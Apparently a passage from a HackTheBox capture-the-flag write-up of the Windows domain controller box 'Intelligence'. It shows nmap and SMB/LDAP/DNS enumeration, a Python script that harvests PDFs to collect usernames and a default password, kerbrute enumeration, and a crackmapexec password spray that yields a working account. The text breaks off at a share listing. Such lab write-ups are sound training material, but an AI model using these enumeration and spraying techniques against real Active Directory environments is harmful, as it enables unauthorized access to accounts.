---
title: HTB: Intelligence
url: https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html
date: 2021-11-27T14:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: ctf, htb-intelligence, hackthebox, nmap, windows, crackmapexec, smbmap, smbclient, smb, dns, dnsenum, ldapsearch, exiftool, feroxbuster, kerbrute, python, password-spray, bloodhound, bloodhound-python, dnstool, responder, hashcat, readgmsapassword, gmsa, gmsadumper, silver-ticket, wmiexec, oscp-like-v2, oscp-like-v3
---

![Intelligence](https://0xdfimages.gitlab.io/img/intelligence-cover.png)

Intelligence was a great box for Windows and Active Directory enumeration and exploitation. I’ll start with a lot of enumeration against a domain controller. Eventually I’ll brute force a naming pattern to pull down PDFs from the website, finding the default password for new user accounts. Spraying that across all the users I enumerated returns one that works. From there, I’ll find a PowerShell script that runs every five minutes on Intelligence that is making a web request to each DNS in the AD environment that starts with web. I’ll add myself as a server, and use responder to capture a hash when it next runs. On cracking that hash, I’ll have a new user, and bloodhound shows that account has control over a service accounts GMSA password. That service account has delegation on the domain. I’ll exploit those relationships to get administrator on the box.

## Box Info

| Name | [Intelligence](https://hackthebox.com/machines/intelligence)  [Intelligence](https://hackthebox.com/machines/intelligence) [Play on HackTheBox](https://hackthebox.com/machines/intelligence) |
| --- | --- |
| Release Date | [03 Jul 2021](https://twitter.com/hackthebox_eu/status/1409877077168463887) |
| Retire Date | 27 Nov 2021 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Intelligence |
| Radar Graph | Radar chart for Intelligence |
| First Blood User | 00:14:35[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 00:56:44[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creator | [Micah Micah](https://app.hackthebox.com/users/22435) |

## Recon

### nmap

`nmap` found a bunch of open TCP ports, including DNS (53), HTTP (80), Kerberos (88), LDAP (389) and SMB/RCP (135, 139, and 445):

```

oxdf@parrot$ nmap -p- -oA scans/nmap-alltcp 10.10.10.248                      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 21:33 EDT
Nmap scan report for intelligence.htb (10.10.10.248)
Host is up (0.027s latency).
Not shown: 65518 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49702/tcp open  unknown
49714/tcp open  unknown
51596/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 364.44 seconds
oxdf@parrot$ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sCV -oA scans/nmap-tcpscripts 10.10.10.248
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 21:40 EDT
Nmap scan report for intelligence.htb (10.10.10.248)
Host is up (0.032s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-13 08:43:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-13T08:44:54+00:00; +7h03m18s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-13T08:44:54+00:00; +7h03m18s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-13T08:44:54+00:00; +7h03m18s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-13T08:44:54+00:00; +7h03m18s from scanner time.
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h03m17s, deviation: 0s, median: 7h03m17s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-13T08:44:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.57 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the host is at least Windows 10 / Server 2016+. The combination of DNS, Kerberos, and LDAP suggests this is a Windows domain controller. Also, with Kerberos, if I manage to find usernames, I can try ASREP-roasting, and if I find creds, I can try Kerberoasting.

Given DNS is listening on TCP, it probably is on UDP as well. `nmap` shows both DNS and NTP (123):

```

oxdf@parrot$ sudo nmap -sU --top-ports 10 -sV -oA scans/nmap-udp-10ports-scrip
ts 10.10.10.248
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 20:52 EDT
Nmap scan report for intelligence.htb (10.10.10.248)
Host is up (0.025s latency).

PORT     STATE         SERVICE      VERSION
53/udp   open          domain       (generic dns response: SERVFAIL)
67/udp   open|filtered dhcps
123/udp  open          ntp          NTP v3
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open|filtered snmp
445/udp  open|filtered microsoft-ds
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.91%I=7%D=8/11%Time=611470DC%P=x86_64-pc-linux-gnu%r(NBTS
SF:tat,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAAA
SF:AAAAAAA\0\0!\0\x01");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.92 secondsh

```

### SMB - TCP 445

CrackMapExec shows the full OS information:

```

oxdf@parrot$ crackmapexec smb 10.10.10.248
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)

```

It also shows the domain name of intelligence.htb and the hostname of DC.

`smbmap` isn’t able to get access:

```

oxdf@parrot$ smbmap -H 10.10.10.248 
[+] IP: 10.10.10.248:445        Name: 10.10.10.248                                      
oxdf@parrot$ smbmap -H 10.10.10.248 -u 0xdf -p 0xdf
[!] Authentication error on 10.10.10.248

```

`smbclient` thinks it authenticates, but then it shows no shares:

```

oxdf@parrot$ smbclient -N -L //10.10.10.248
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

```

### DNS - TCP/UDP 53

Querying Intelligence for the domain identified by `crackmapexec` returns the expected information, and nothing more:

```

oxdf@parrot$ dig @10.10.10.248 intelligence.htb

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.248 intelligence.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 33140
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;intelligence.htb.              IN      A

;; ANSWER SECTION:
intelligence.htb.       600     IN      A       10.10.10.248

;; Query time: 51 msec
;; SERVER: 10.10.10.248#53(10.10.10.248)
;; WHEN: Wed Aug 11 20:21:31 EDT 2021
;; MSG SIZE  rcvd: 61

```

Because TCP DNS is listening, I’ll try a zone transfer, but it fails:

```

oxdf@parrot$ dig axfr @10.10.10.248 intelligence.htb

; <<>> DiG 9.16.15-Debian <<>> axfr @10.10.10.248 intelligence.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

```

`dnsenum` will automate much of that as well as brute force subdomains. It finds dc.intelligence.htb, as well as a couple other domain controller-looking ones:

```

oxdf@parrot$ dnsenum --dnsserver 10.10.10.248 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o scans/dnsenum-bitquark-intelligence.htb intelligence.htb dnsenum VERSION:1.2.6
-----   intelligence.htb   -----

Host's addresses:
__________________

intelligence.htb.                        600      IN    A        10.10.10.248

Name Servers:
______________

dc.intelligence.htb.                     3600     IN    A        10.10.10.248

Mail (MX) Servers:
___________________

Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: dc.intelligence.htb at /usr/bin/dnsenum line 900.

Trying Zone Transfer for intelligence.htb on dc.intelligence.htb ... 
AXFR record query failed: no nameservers

Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:
________________________________________________________________________________________

dc.intelligence.htb.                     3600     IN    A        10.10.10.248
domaindnszones.intelligence.htb.         600      IN    A        10.10.10.248
forestdnszones.intelligence.htb.         600      IN    A        10.10.10.248

intelligence.htb class C netranges:
____________________________________

Performing reverse lookup on 0 ip addresses:
_____________________________________________

0 results out of 0 IP addresses.

intelligence.htb ip blocks:
____________________________

done.

```

I’ll add all of these to `/etc/hosts`.

### LDAP - TCP 389

`ldapsearch` will give the domains associated with this DC, including the two I found with brute force earlier:

```

oxdf@parrot$ ldapsearch -h 10.10.10.248 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

I wasn’t able to get any additional information from there:

```

oxdf@parrot$ ldapsearch -h 10.10.10.248 -x -b "DC=intelligence,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=intelligence,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

### Website - TCP 80

#### Site

The web page is for a company, but it’s pretty vague what they do:

[![image-20210813140749794](https://0xdfimages.gitlab.io/img/image-20210813140749794.png)](https://0xdfimages.gitlab.io/img/image-20210813140749794.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210813140749794.png)

There’s not much here. `contact@intelligence.htb` is an email address. The only other two links on the page at the two documents:
- `http://intelligence.htb/documents/2020-01-01-upload.pdf`
- `http://intelligence.htb/documents/2020-12-15-upload.pdf`

Both documents only contain [lorem ipsum](https://en.wikipedia.org/wiki/Lorem_ipsum) text (gibberish). For example:

![image-20210814203243002](https://0xdfimages.gitlab.io/img/image-20210814203243002.png)

The exif data on each doesn’t provide much, but it does give what looks like a use name for each:

```

oxdf@parrot$ exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2021:08:14 20:29:29-04:00
File Access Date/Time           : 2021:08:14 20:29:59-04:00
File Inode Change Date/Time     : 2021:08:14 20:29:50-04:00
File Permissions                : rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
oxdf@parrot$ exiftool 2020-12-15-upload.pdf 
ExifTool Version Number         : 12.16
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 KiB
File Modification Date/Time     : 2021:08:14 20:33:36-04:00
File Access Date/Time           : 2021:08:14 20:33:36-04:00
File Inode Change Date/Time     : 2021:08:14 20:33:37-04:00
File Permissions                : rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and use a lowercase wordlist since it’s Windows (case-insensitive):

```

oxdf@parrot$ feroxbuster -u http://intelligence.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/feroxbuster-intelligence.htb-raft-med-lowercase

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://intelligence.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ scans/feroxbuster-intelligence.htb-raft-med-lowercase
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        2l       10w      157c http://intelligence.htb/documents
[####################] - 1m     53166/53166   0s      found:1       errors:0      
[####################] - 1m     26583/26583   339/s   http://intelligence.htb
[####################] - 1m     26583/26583   331/s   http://intelligence.htb/documents

```

It just found the `/documents` folder that I noted above. It’s returning a 301 redirect, and checking in Firefox, that redirect is just to add a trailing `/`. Once that’s followed, `http://intelligence.htb/documents/` returns 403 forbidden.

### Kerberos - TCP 88

The exif data in the PDFs had what looked like valid user names. I’ll check that against Kerberos with [kerbrute](https://github.com/ropnop/kerbrute), and both come back as valid usernames on the domain:

```

oxdf@parrot$ kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/14/21 - Ronnie Flathers @ropnop

2021/08/14 20:53:54 >  Using KDC(s):
2021/08/14 20:53:54 >   10.10.10.248:88

2021/08/14 20:53:55 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/08/14 20:53:55 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/08/14 20:53:55 >  Done! Tested 2 usernames (2 valid) in 0.100 seconds

```

With two usernames, I can check to see if either has the don’t require preauth flag set, which would leak the users hash (this is AS-REP-roasting), but neither is set that way:

```

oxdf@parrot$ GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/Jose.Williams
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for Jose.Williams
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
oxdf@parrot$ GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/William.Lee
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for William.Lee
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set

```

## SMB Access as Tiffany.Molina

### Find Additional PDFs

Looking at the filename of the PDFs on the website, the filenames fit the pattern `YYYY-MM-DD-upload.pdf`. It’s reasonable to think that there could be PDFs of that same format not linked on the site. I’ll write a short Python script to look for other PDFs of the same format:

```

#!/usr/bin/env python3

import datetime
import requests

t = datetime.datetime(2020, 1, 1)  
end = datetime.datetime(2021, 7, 4) 

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")  
    resp = requests.get(url)
    if resp.status_code == 200:
        print(url)
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break

```

I’ll use July 4 as that’s the day after this box was released on HackTheBox. This script returns *way* more files than I was expecting:

```

oxdf@parrot$ python3 findpdfs.py                                  
http://intelligence.htb/documents/2020-01-01-upload.pdf
http://intelligence.htb/documents/2020-01-02-upload.pdf
http://intelligence.htb/documents/2020-01-04-upload.pdf
http://intelligence.htb/documents/2020-01-10-upload.pdf
http://intelligence.htb/documents/2020-01-20-upload.pdf
http://intelligence.htb/documents/2020-01-22-upload.pdf
http://intelligence.htb/documents/2020-01-23-upload.pdf
http://intelligence.htb/documents/2020-01-25-upload.pdf
http://intelligence.htb/documents/2020-01-30-upload.pdf
...[snip]...
http://intelligence.htb/documents/2021-03-01-upload.pdf
http://intelligence.htb/documents/2021-03-07-upload.pdf
http://intelligence.htb/documents/2021-03-10-upload.pdf
http://intelligence.htb/documents/2021-03-18-upload.pdf
http://intelligence.htb/documents/2021-03-21-upload.pdf
http://intelligence.htb/documents/2021-03-25-upload.pdf
http://intelligence.htb/documents/2021-03-27-upload.pdf

```

I’ll need to automate this a bit. I’ll add a keyword list, and print any text that contains any of these words:

```

#!/usr/bin/env python3

import datetime
import io
import PyPDF2
import requests

t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        with io.BytesIO(resp.content) as data:
            pdf = PyPDF2.PdfFileReader(data)
            users.add(pdf.getDocumentInfo()['/Creator'])
            for page in range(pdf.getNumPages()):
                text = pdf.getPage(page).extractText()
                if any([k in text.lower() for k in keywords]):
                    print(f'==={url}===\n{text}')
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break

with open('users', 'w') as f:
    f.write('\n'.join(users)) 

```

I also added some logic to record unique users and write that to a file at the end.

The script finds two messages and 30 users (`wc` reports 29 because there’s no trailing newline):

```

oxdf@parrot$ python3 findpdfs.py
===http://intelligence.htb/documents/2020-06-04-upload.pdf===
NewAccountGuide
WelcometoIntelligenceCorp!
Pleaseloginusingyourusernameandthedefaultpasswordof:
NewIntelligenceCorpUser9876
Afterlogginginpleasechangeyourpasswordassoonaspossible.

===http://intelligence.htb/documents/2020-12-30-upload.pdf===
InternalITUpdate
Therehasrecentlybeensomeoutagesonourwebservers.Tedhasgottena
scriptinplacetohelpnotifyusifthishappensagain.
Also,afterdiscussionfollowingourrecentsecurityauditweareintheprocess
oflockingdownourserviceaccounts.

oxdf@parrot$ wc -l users 
29 users

```

It’s not clear to me why the spaces get dropped, but it’s still clear what each PDF is saying. The default initial password is “NewIntelligenceCorpUser9876” and it’s on the user to change it.

There’s also some security issue with service accounts.

### Validate Users

I’ll use `kerbrute` again to validate the usernames, and all are valid:

```

oxdf@parrot$ kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/14/21 - Ronnie Flathers @ropnop

2021/08/14 21:28:45 >  Using KDC(s):
2021/08/14 21:28:45 >   10.10.10.248:88

2021/08/14 21:28:45 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2021/08/14 21:28:45 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2021/08/14 21:28:45 >  Done! Tested 30 usernames (30 valid) in 0.255 seconds

```

### Password Spray

I’ll use `crackmapexec` to try each of these user accounts with the default password. I like to use `--continue-on-success` so that if more than one account matches with that password, I’ll know (otherwise it stops on the first success). It finds one user, Tiffany.Molina:

```

oxdf@parrot$ crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876 --continue-on-success
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 

```

### SMB

`smbmap` shows a handful of shares that Tiffany.Molina can access:

```

oxdf@parrot$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.10.10.248
[+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY

```

Connecting with `smbclient` shows that `Users` is `C:\Users`, where the home directories are:

```

oxdf@parrot$ smbclient -U Tiffany.Molina //10.10.10.248/Users NewIntelligenceCorpUser9876
Try "help" to get a list of possible commands.                                                           
smb: \> ls                       
  .                                  DR        0  Sun Apr 18 21:20:26 2021
  ..                                 DR        0  Sun Apr 18 21:20:26 2021
  Administrator                       D        0  Sun Apr 18 20:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
  Default                           DHR        0  Sun Apr 18 22:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
  Public                             DR        0  Sun Apr 18 20:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021
                                                    
                3770367 blocks of size 4096. 1462999 blocks available

```

`user.txt` is on Tiffany.Molina’s desktop:

```

smb: \Tiffany.Molina\desktop\> ls
  .                                  DR        0  Sun Apr 18 20:51:46 2021
